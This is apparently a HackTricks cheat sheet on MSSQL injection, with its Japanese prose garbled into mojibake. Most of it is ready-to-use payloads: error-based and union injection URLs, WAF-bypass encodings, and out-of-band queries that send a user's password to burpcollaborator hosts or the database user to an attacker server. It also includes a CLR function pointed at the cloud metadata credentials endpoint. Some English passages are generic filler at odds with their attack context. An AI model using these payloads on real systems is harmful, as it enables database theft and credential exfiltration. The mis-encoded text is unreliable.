# MSSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## Active Directoryã®åˆ—æŒ™

MSSQLã‚µãƒ¼ãƒãƒ¼å†…ã§ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®MSSQLé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

* **`SELECT DEFAULT_DOMAIN()`**: ç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’å–å¾—ã—ã¾ã™ã€‚
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: ãƒ‰ãƒ¡ã‚¤ãƒ³ã®åå‰ã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆï¼ˆã“ã®ä¾‹ã§ã¯_DOMAINï¼‰ã€ã“ã®é–¢æ•°ã¯16é€²æ•°å½¢å¼ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼Administratorã®**SIDã‚’è¿”ã—ã¾ã™**ã€‚ã“ã‚Œã¯`0x01050000000[...]0000f401`ã®ã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚æœ€å¾Œã®4ãƒã‚¤ãƒˆã¯ã€**big endian**å½¢å¼ã§ã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼administratorã®å…±é€šIDã§ã‚ã‚‹500**ã§ã™ã€‚\
ã“ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æœ€å¾Œã®4ãƒã‚¤ãƒˆä»¥å¤–ã®**ãƒ‰ãƒ¡ã‚¤ãƒ³ã®IDã‚’çŸ¥ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : ã“ã®é–¢æ•°ã¯ã€æŒ‡å®šã•ã‚ŒãŸIDã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’è¿”ã—ã¾ã™**ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã€‚ã“ã®å ´åˆã€big endianã§**0000e803** == **1000**ï¼ˆé€šå¸¸ã€ã“ã‚Œã¯æœ€åˆã®é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã®IDã§ã™ï¼‰ã€‚ãã®å¾Œã€1000ã‹ã‚‰2000ã¾ã§ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã€ãŠãã‚‰ããƒ‰ãƒ¡ã‚¤ãƒ³ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å–å¾—ã§ãã‚‹ã¨æƒ³åƒã§ãã¾ã™ã€‚æ¬¡ã®ã‚ˆã†ãªé–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **ä»£æ›¿ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ™ã‚¯ãƒˆãƒ«**

ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯é€šå¸¸ã€`+AND+1=@@version--`ãªã©ã®æ§‹é€ ã‚’æŒã¡ã€ORæ¼”ç®—å­ã«åŸºã¥ããƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®ã‚ˆã†ãªå¼ã‚’å«ã‚€ã‚¯ã‚¨ãƒªã¯é€šå¸¸ã€WAFã«ã‚ˆã£ã¦ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ã€‚ãƒã‚¤ãƒ‘ã‚¹ã¨ã—ã¦ã€ç‰¹å®šã®é–¢æ•°å‘¼ã³å‡ºã—ã®çµæœã«%2bæ–‡å­—ã‚’ä½¿ç”¨ã—ã¦æ–‡å­—åˆ—ã‚’é€£çµã—ã€æ±‚ã‚ã¦ã„ã‚‹ãƒ‡ãƒ¼ã‚¿ã«ãƒ‡ãƒ¼ã‚¿å‹å¤‰æ›ã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™é–¢æ•°ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚

ã“ã®ã‚ˆã†ãªé–¢æ•°ã®ä¾‹ï¼š

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

é–¢æ•°`USER_NAME()`ã®ä½¿ç”¨ä¾‹ï¼š
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

### `fn_xe_file_target_read_file`

SSRFï¼ˆServer-Side Request Forgeryï¼‰ã¯ã€æ”»æ’ƒè€…ãŒã‚µãƒ¼ãƒãƒ¼å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã‚µãƒ¼ãƒãƒ¼ã‚’åˆ©ç”¨ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚

ã“ã®æ”»æ’ƒæ‰‹æ³•ã¯ã€`fn_xe_file_target_read_file`ã¨ã„ã†é–¢æ•°ã‚’æ‚ªç”¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ã€SQL Serverã®æ‹¡å¼µã‚¤ãƒ™ãƒ³ãƒˆï¼ˆExtended Eventsï¼‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€ã“ã®é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã€ã‚µãƒ¼ãƒãƒ¼å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒæ‰‹æ³•ã‚’é˜²ããŸã‚ã«ã¯ã€é©åˆ‡ãªã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã¨å…¥åŠ›æ¤œè¨¼ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/3.png)

**æ¨©é™:** ã‚µãƒ¼ãƒãƒ¼ä¸Šã§**`VIEW SERVER STATE`**æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

`fn_get_audit_file` is a built-in function in Microsoft SQL Server that allows you to retrieve audit information from the server's audit log files. This function is commonly used for auditing and compliance purposes, as it provides a way to access detailed information about database activities.

To use `fn_get_audit_file`, you need to specify the path to the audit log file and provide the necessary parameters to filter the results. The function returns a table with columns representing different aspects of the audit information, such as the event type, timestamp, and target object.

It's important to note that `fn_get_audit_file` requires the necessary permissions to access the audit log files. Additionally, you should ensure that the audit log files are stored in a secure location to prevent unauthorized access to sensitive information.

Overall, `fn_get_audit_file` is a useful function for retrieving and analyzing audit information in Microsoft SQL Server. By leveraging this function, you can gain insights into database activities and enhance the security and compliance of your SQL Server environment.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/2.png)

**æ¨©é™:** **`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettable`

`fn_trace_gettable` is a built-in function in Microsoft SQL Server that allows you to read the contents of a trace file and return the data in a tabular format. This function is commonly used for troubleshooting and performance analysis purposes.

To use `fn_trace_gettable`, you need to provide the path of the trace file and specify the columns you want to retrieve. The function will then parse the trace file and return the requested data.

Here is the syntax for using `fn_trace_gettable`:

```sql
SELECT *
FROM fn_trace_gettable('C:\Path\To\TraceFile.trc', default)
```

In the above example, `C:\Path\To\TraceFile.trc` is the path to the trace file you want to read. The `default` parameter specifies the default file format for the trace file.

Keep in mind that `fn_trace_gettable` requires the necessary permissions to access the trace file. Additionally, it is important to ensure that the trace file is not accessible to unauthorized users, as it may contain sensitive information.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/1.png)

**æ¨©é™:** **`CONTROL SERVER`** æ¨©é™ãŒå¿…è¦ã§ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

MSSQLã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚³ãƒ¼ãƒ«ã‚’è¡Œã†ãŸã‚ã®æœ€ã‚‚ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€æ ¼ç´ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£`xp_dirtree`ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯Microsoftã«ã‚ˆã£ã¦å…¬å¼ã«ã¯æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€[ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®ä»–ã®äººã€…ã«ã‚ˆã£ã¦æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã™](https://www.baronsoftware.com/Blog/sql-stored-procedures-get-folder-files/)ã€‚ã“ã®æ–¹æ³•ã¯ã€[ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®[Out of Band Data exfiltration](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/)ã®æŠ•ç¨¿ã§è¤‡æ•°ã®ä¾‹ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

åŸºæœ¬çš„ã«ã¯ã€
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\'+@user+'.attacker-server\aa"');
```
MySQLã®`LOAD_FILE`ã¨åŒæ§˜ã«ã€`xp_dirtree`ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’**TCPãƒãƒ¼ãƒˆ445ã®ã¿**ã«è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒãƒ¼ãƒˆç•ªå·ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å…±æœ‰ã‹ã‚‰æƒ…å ±ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ³¨æ„ï¼š**ã“ã‚Œã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®è¨­å®šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹`Windows Server 2016 Datacenter`ä¸Šã®`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`ã§ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ã€‚

**ä»–ã«ã‚‚**ã€[**`master..xp_fileexist`ã®ã‚ˆã†ãª**](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx)ã‚¹ãƒˆã‚¢ãƒ‰ãƒ—ãƒ­ã‚·ãƒ¼ã‚¸ãƒ£ã‚„**`xp_subdirs`**ãªã©ã€åŒæ§˜ã®çµæœã‚’å¾—ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚‚ã®ãŒã‚ã‚Šã¾ã™ã€‚

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

ã‚‚ã¡ã‚ã‚“ã€**`xp_cmdshell`**ã‚’ä½¿ç”¨ã—ã¦**SSRFã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ä½•ã‹ã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€ãƒšãƒ¼ã‚¸ã®**é–¢é€£ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã‚’èª­ã‚“ã§ãã ã•ã„ï¼š

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQLãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©é–¢æ•° - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

**CLR UDF**ï¼ˆCommon Language Runtime User Defined Function - **.NET**è¨€èªã§æ›¸ã‹ã‚Œã€**DLL**ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ï¼‰ã‚’ç°¡å˜ã«ä½œæˆã—ã€MSSQLå†…ã§ã‚«ã‚¹ã‚¿ãƒ é–¢æ•°ã¨ã—ã¦ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã ã—ã€ã“ã‚Œã«ã¯`dbo`ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ãªã®ã§ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®æ¥ç¶šãŒ**`sa`ã¾ãŸã¯ç®¡ç†è€…ã®å½¹å‰²**ã¨ã—ã¦è¡Œã‚ã‚Œã¦ã„ãªã„é™ã‚Šã€æ©Ÿèƒ½ã—ãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

[ã“ã®Githubãƒªãƒã‚¸ãƒˆãƒªã«ã¯ã€Visual Studioãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã¨ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ãŒã‚ã‚Šã¾ã™](https://github.com/infiniteloopltd/SQLHttp)ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒã‚¤ãƒŠãƒªã‚’CLRã‚¢ã‚»ãƒ³ãƒ–ãƒªã¨ã—ã¦MSSQLã«ãƒ­ãƒ¼ãƒ‰ã—ã€MSSQLå†…ã‹ã‚‰HTTP GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚

[`http.cs`ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€`WebClient`ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã—ã¦GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã„ã€ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å–å¾—ã—ã¾ã™](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)ã€‚
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ‰‹é †ã§ã¯ã€`CREATE ASSEMBLY` ã‚¯ã‚¨ãƒªã®å‰ã«ä»¥ä¸‹ã‚’å®Ÿè¡Œã—ã¦ã€ã‚¢ã‚»ãƒ³ãƒ–ãƒªã®SHA512ãƒãƒƒã‚·ãƒ¥ã‚’ã‚µãƒ¼ãƒãƒ¼ã®ä¿¡é ¼ã•ã‚ŒãŸã‚¢ã‚»ãƒ³ãƒ–ãƒªã®ãƒªã‚¹ãƒˆã«è¿½åŠ ã—ã¾ã™ï¼ˆ`select * from sys.trusted_assemblies;` ã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã§ãã¾ã™ï¼‰ã€‚
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
ã‚¢ã‚»ãƒ³ãƒ–ãƒªãŒè¿½åŠ ã•ã‚Œã€é–¢æ•°ãŒä½œæˆã•ã‚ŒãŸã‚‰ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/15.png)

## **ã‚¯ã‚¤ãƒƒã‚¯ãªæ”»æ’ƒ: 1ã¤ã®ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«å…¨ä½“ã‚’å–å¾—ã™ã‚‹**

1ã¤ã®ã‚¯ã‚¨ãƒªã§ãƒ†ãƒ¼ãƒ–ãƒ«ã®å…¨å†…å®¹ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã¯ã€FOR XMLã¾ãŸã¯FOR JSONå¥ã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚FOR XMLå¥ã¯ã€Œrawã€ã¨ã„ã£ãŸæŒ‡å®šã•ã‚ŒãŸãƒ¢ãƒ¼ãƒ‰ãŒå¿…è¦ã§ã™ãŒã€ç°¡æ½”ã•ã®è¦³ç‚¹ã‹ã‚‰FOR JSONãŒå„ªã‚Œã¦ã„ã¾ã™ã€‚

ç¾åœ¨ã®ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã‚¹ã‚­ãƒ¼ãƒã€ãƒ†ãƒ¼ãƒ–ãƒ«ã€åˆ—ã‚’å–å¾—ã™ã‚‹ã‚¯ã‚¨ãƒª:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

ã‚¨ãƒ©ãƒ¼ãƒ™ãƒ¼ã‚¹ã®ãƒ™ã‚¯ã‚¿ãƒ¼ã¯ã€JSONã¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã™ã‚‹ã“ã¨ãŒã§ããªã„ãŸã‚ã€ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã¾ãŸã¯åå‰ãŒå¿…è¦ã§ã™ã€‚
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **ç¾åœ¨ã®ã‚¯ã‚¨ãƒªã®å–å¾—**

å®Ÿè¡Œä¸­ã®SQLã‚¯ã‚¨ãƒªã¯ã€`sys.dm_exec_requests`ã¨`sys.dm_exec_sql_text`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‹ã‚‰å–å¾—ã§ãã¾ã™ã€‚
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**æ¨©é™:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µãƒ¼ãƒãƒ¼ä¸Šã§VIEW SERVER STATEæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯SQL Serverã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§å®Ÿè¡Œä¸­ã®ã™ã¹ã¦ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ãã‚Œä»¥å¤–ã®å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ç¾åœ¨ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®ã¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **WAFãƒã‚¤ãƒ‘ã‚¹ã®ãŸã‚ã®å°æŠ€**

éæ¨™æº–ã®ç©ºç™½æ–‡å­—: %C2%85ã¾ãŸã¯%C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
ç§‘å­¦çš„ãªï¼ˆ0eï¼‰ãŠã‚ˆã³16é€²ï¼ˆ0xï¼‰è¡¨è¨˜ã«ã‚ˆã‚‹UNIONã®é›£èª­åŒ–ï¼š

```sql
SELECT column1 FROM table1 WHERE column2 = 0e0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--
SELECT column1 FROM table1 WHERE column2 = 0x0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--
```

```sql
SELECT column1 FROM table1 WHERE column2 = 0e0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--
SELECT column1 FROM table1 WHERE column2 = 0x0 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--
```
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
FROMã¨åˆ—åã®é–“ã«ã¯ã€ã‚¹ãƒšãƒ¼ã‚¹ã®ä»£ã‚ã‚Šã«ãƒ”ãƒªã‚ªãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
\Nã¯ã€SELECTã¨ä½¿ã„æ¨ã¦ã®åˆ—ã®é–“ã®åŒºåˆ‡ã‚Šæ–‡å­—ã§ã™ã€‚
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
## å‚è€ƒæ–‡çŒ®

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#MSSQL)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
